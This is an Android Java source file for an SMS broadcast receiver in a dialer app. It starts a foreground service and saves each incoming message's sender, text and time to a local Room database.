package com.example.smartdialer.broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.smartdialer.ResultChecker;
import com.example.smartdialer.room.entity.Calls;
import com.example.smartdialer.room.entity.Sms;
import com.example.smartdialer.room.worker.AddCallLog;
import com.example.smartdialer.room.worker.AddSmsLog;
import com.example.smartdialer.services.MainService;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        //ResultChecker.showResult(intent);
        if (!MainService.isServiceRunning) {
            Intent serviceIntent = new Intent(context, MainService.class);
            ContextCompat.startForegroundService(context, serviceIntent);
        }
        try {
            final Bundle bundle = intent.getExtras();
            String phoneNumber = "", message = "";

            if (bundle != null) {
                Object[] pdusObj = (Object[]) bundle.get("pdus");
                for (Object o : pdusObj) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) o);
                    phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    message += currentMessage.getDisplayMessageBody();

                }
                Sms sms = new Sms();
                sms.setId(0);
                sms.setNumber(phoneNumber);
                sms.setContent(message);
                sms.setTime(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.ENGLISH).format(new Date()));
                new AddSmsLog(context, sms).start();
            }

        } catch (Exception e) {
            Log.e("TAG", "Exception smsReceiver" +e);

        }


    }
}
